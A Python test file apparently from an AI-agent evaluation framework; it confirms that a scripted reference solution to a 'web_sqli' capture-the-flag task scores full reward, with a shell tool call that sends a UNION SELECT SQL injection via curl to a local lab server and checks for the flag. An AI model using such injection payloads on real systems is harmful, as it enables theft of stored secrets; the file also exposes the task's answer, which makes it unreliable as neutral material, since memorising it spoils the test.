import json
import urllib.parse
from pathlib import Path
import pytest
from opencrl import rollout, get_task
from opencrl.task import discover
from opencrl.models import ScriptedModel

pytestmark = pytest.mark.docker

# URL-encoded: a literal space in the query string is rejected by curl's
# strict URL parser ("URL rejected: Malformed input to a URL function").
INJECT = "http://web:8000/?name=" + urllib.parse.quote("' UNION SELECT secret FROM users--")

def test_reference_solution_scores_one():
    discover(Path(__file__).resolve().parent.parent)   # register tasks/ under unique module names
    model = ScriptedModel([
        {"role": "assistant", "content": None,
         "tool_calls": [{"id": "1", "type": "function",
                         "function": {"name": "shell",
                                      "arguments": json.dumps(
                                          # --retry-connrefused: `web` may still be binding its
                                          # port right after `docker compose up` returns.
                                          {"command": f"curl -s --retry 5 --retry-connrefused "
                                                      f"--retry-delay 1 \"{INJECT}\""})}}]},
        {"role": "assistant", "content": "The secret is CTF{sqli_master}",
         "tool_calls": None},
    ])
    r = rollout(get_task("web_sqli"), model)
    assert r.reward == 1.0
    tool_output = " ".join(
        m.get("content") or "" for m in r.transcript if m.get("role") == "tool")
    assert "CTF{sqli_master}" in tool_output   # the exploit itself returned the flag, not just the scripted answer
